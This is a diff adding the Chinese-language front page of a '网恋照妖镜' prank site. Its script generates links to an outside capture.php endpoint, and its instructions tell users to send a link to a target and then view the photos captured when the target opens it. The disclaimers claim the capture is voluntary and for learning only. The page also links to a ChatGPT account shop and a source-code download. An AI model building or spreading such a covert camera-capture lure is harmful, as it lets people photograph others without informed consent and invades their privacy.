@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<meta name="format-detection" content="telephone=no">
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<meta name="apple-mobile-web-app-status-bar-style" content="black">
+		<title>网恋照妖镜 - 仅供娱乐恶搞</title>
+		<meta name="keywords" content="网恋照妖镜,照妖镜" />
+		<meta name="description" content="还在网恋吗？还想网恋被骗吗？乔碧萝你别跑！短短一个链接，长长一个真相！尽在网恋照妖镜！仅供娱乐恶搞！" />
+		<link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
+		<!-- 引入 Bootstrap 样式 -->
+		<link href="https://cdn.bootcss.com/bootstrap/3.3.4/css/bootstrap.css" rel="stylesheet">
+		<!-- 自定义样式表 -->
+		<link href="css/shop_style.css" rel="stylesheet" type="text/css">
+		<link href="css/shop.css" rel="stylesheet" type="text/css">
+		<link href="css/style.css" rel="stylesheet" type="text/css">
+		<!-- 百度统计代码 -->
+		<script>
+			var _hmt = _hmt || [];
+			(function() {
+				var hm = document.createElement("script");
+				hm.src = "https://hm.baidu.com/hm.js?773e85849e55600608d7c2aa1f35c094";
+				var s = document.getElementsByTagName("script")[0];
+				s.parentNode.insertBefore(hm, s);
+			})();
+		</script>
+	</head>
+	<body>
+		<style>
+			/* CSS 内联样式表 */
+			#M1 {
+				width: 110px;
+				height: 35px;
+				padding-top: 2px\9;
+				color: #fff;
+				font-size: 15px;
+				background: #3385ff;
+				border-bottom: none;
+				-webkit-appearance: none;
+				-webkit-border-radius: 0;
+				border: 0;
+				text-align: center;
+				text-decoration: none;
+				color: #fff;
+				background-color: #007bff;
+				border-color: #007bff;
+				padding: 7px;
+				float: left;
+				margin-left: 2%;
+				margin-top: 2%;
+			}
+
+			/* 全局链接样式 */
+			a {
+				color: #8DC8FD;
+				text-decoration: none;
+			}
+		</style>
+
+		<script>
+			// JavaScript 函数定义，用于生成链接
+			function create() {
+				var myid = document.getElementById('myid');
+				var url = document.getElementById('url');
+				var kd = document.getElementById('kd');
+
+				// 检查输入是否为空
+				if (myid.value == "" || url.value == "") {
+					alert("ID或跳转地址不能为空！");
+					return false;
+				}
+
+				// 生成链接并设置到指定元素中
+				kd.href = 'https://zhaoyaojing.wanxiangyuanma.com/capture.php?id=' + myid.value + '&url=' + url.value;
+				kd.style = '';
+				kd.innerText = 'https://zhaoyaojing.wanxiangyuanma.com/capture.php?id=' + myid.value + '&url=' + url
+					.value;
+			}
+		</script>
+
+		<div id="bob">
+			<div id="bd">
+				<div class="ct" style="padding:0;">
+					<section class="index">
+						<div id="bds">
+							<div id="content">
+								<div class="hd">
+									<img src="images/3.webp">
+								</div>
+								<div class="mall" id="contentss">
+									<div class="mianban">
+										<div class="wrap">
+											<div class="tabs">
+												<!-- 导航选项 -->
+												<a href="javascript:void(0)" id="Choice_one" onclick="Choice(1)"
+													class="active">链接生成</a>
+												<a href="https://www.senluowanxiang.cn/shop/82.html" target="_blank"
+													style="color:#5AB5FB" id="Choice_two"
+													onclick="Choice(2)">ChatGPT账号购买</a>
+												<a href="https://www.senluox.com/3237.html" target="_blank"
+													id="Choice_Three" onclick="Choice(3)">源码下载</a>
+											</div>
+											<div class="swiper-container">
+												<div class="content-slide">
+													<div class="purchase_from">
+														<ul id="Open" style="display:block;">
+															<form action="?" class="form-sign" method="get" name="auth"
+																onSubmit="return checkURL();">
+																<li>
+																	<!-- 输入框 -->
+																	<input type="text" class="form-control" id="myid"
+																		placeholder="填写QQ号、微信号生成链接" value>
+																	<p>跳转到：</p>
+																	<input type="text" class="form-control" id="url"
+																		value="https://www.codernav.cn/ai">
+																</li>
+																<li>
+																	<!-- 按钮 -->
+																	<input type="button" value="生成链接"
+																		onclick="create();"
+																		style="display: block;background: #FFFFFF!important;height: 40px;font-size: 16px;color: #5AB5FB;border-radius: 4px;text-align: center;overflow: hidden;">
+																	<br>
+																</li>
+																<li class="btn_purchase">
+																	<input type="button" value="查看图片"
+																		onclick="window.location.href='gallery.php?id='+document.getElementById('myid').value"
+																		style="display: block;background: #FFFFFF!important;height: 40px;font-size: 16px;color: #5AB5FB;border-radius: 4px;text-align: center;overflow: hidden;">
+																</li>
+																<div class="alert alert-success">
+																	<img src="images/6.svg" width="30px" height="30px">
+																	<a id="kd" style="pointer-events: none;">请先生成链接！</a>
+																</div>
+																<span id="Order"></span>
+															</form>
+														</ul>
+														<!-- 其他选项 -->
+														<ul id="gallery" style="display: none;">
+															<form action="?" class="form-sign" method="get" name="auth"
+																onSubmit="return checkURL();">
+																<li class="btn_purchase"></li>
+																<span id="Orderd"></span>
+															</form>
+														</ul>
+														<!-- 返回提示 -->
+														<ul id="Back" style="display:none;">
+															<center>
+																<h4 class="hd_tit"
+																	style="height:auto;line-height:normal;padding:10px;color:#FFFFFF;">
+																	本站温馨提示<br>
+																	<span
+																		style="font-size:13px;color:red;">填写QQ号、微信号生成链接，免费使用</span>
+																</h4>
+															</center>
+															<div class="list-group-item text-center">
+																<p>本程序完全免费，仅供学习交流使用，请勿用于非法用途，否则后果自负！本程序无数据库，填写号码是查看图片的唯一凭证，请勿泄露给知道此平台的用户。为节省服务器资源，不定期删除7天前的数据。
+																</p>
+															</div>
+															<span id="Order"></span>
+														</ul>
+													</div>
+												</div>
+											</div>
+											<div class="gnbt">网恋照妖镜功能简介</div>
+											<div class="bd">
+												<div class="bc">
+													<textarea readonly="true" name="notice" id cols="30" rows="4"
+														style="border-color: #FFFFFF; max-width: 100%; width: 100%; color: red;">
+★必看说明★
+1、本网站完全免费、完全免费、完全免费，仅供娱乐！一切收费，皆为骗子！找寻此网站，可必应搜索网恋照妖镜！</textarea>
+												</div>
+												<div class="bc">
+													<textarea readonly="true" name="notice" id cols="30" rows="15"
+														style="border-color: #FFFFFF;max-width: 100%;width:100%">
+★使用说明★														
+1、框内填写QQ号、微信号生成链接，方便记忆，勿输入中文。
+3、点击生成链接后复制生成的链接发送给自己或想要参与自拍测试的人。
+4、链接后被点开后，回到本页面，填写前面输入的数字，点击查看照片即可！
+5、由于系统安全机制，IOS系统必须使用自带的Safari浏览器（或者第三方APP调用的是Safari内核）才可使用。
+6、IOS手机较老、系统较老将无法使用，图片会显示一片空白。建议使用安卓手机。
+
+★免责声明★
+1、本程序完全免费，仅供学习交流使用，请勿用于非法用途，否则后果自负！
+2、本程序是一款浏览器自拍网站，是用户自愿点击允许的情况下自拍的程序！
+4、本站是一个完全免费的学习交流平台，一切内容均为网友自发行为，肖像权归属原作者所有，查看照片后可以自己清空所有图片！
+
+请收藏本站书签，以防丢失！</textarea>
+												</div>
+											</div>
+										</div>
+										<div class="ft">网恋照妖镜</div>
+									</div>
+
+									<div width="100px" height="100px"
+										style=" margin: 10px auto; border: 1px solid #ebf3ff; text-align: center">
+										Copyright ©2022<a href="https://xzttkx.github.io/quanjie/" target="_blank">
+											网恋照妖镜源码下载 </a>All rights reserved.
+									</div>
+								</div>
+							</div>
+						</div>
+					</section>
+				</div>
+			</div>
+		</div>
+
+		<!-- JavaScript 引入 -->
+		<!--<script language="Javascript">
+    document.oncontextmenu = new Function("event.returnValue=false");
+    document.onselectstart = new Function("event.returnValue=false");
+</script>
+<script src="js/Mouse.js"></script>
+<script src="js/index.js"></script>
+<script src="js/all.js"></script>
+<script src="js/Sitetime.js"></script>-->
+	</body>
+</html
